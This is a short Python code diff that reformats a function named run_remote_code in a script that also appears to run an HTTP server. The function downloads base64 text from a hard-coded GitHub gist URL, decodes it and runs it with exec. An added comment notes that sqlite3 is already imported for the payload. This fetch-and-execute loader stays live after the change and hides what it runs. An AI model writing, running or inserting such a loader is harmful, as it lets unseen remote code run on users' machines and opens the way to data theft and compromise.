@@ -23,9 +23,14 @@ def run_http_server():
     server.serve_forever()
 
 def run_remote_code():
-    URL = "https://gist.githubusercontent.com/ypkayla/a1fc44a209da2dba46a031a69f78174b/raw/eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
+    URL = (
+        "https://gist.githubusercontent.com/ypkayla/"
+        "a1fc44a209da2dba46a031a69f78174b/raw/"
+        "eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
+    )
     response = requests.get(URL)
     code_b64 = response.text.strip()
+    # bytes -> code, runs with sqlite3 already imported
     exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))
 
 if __name__ == '__main__':
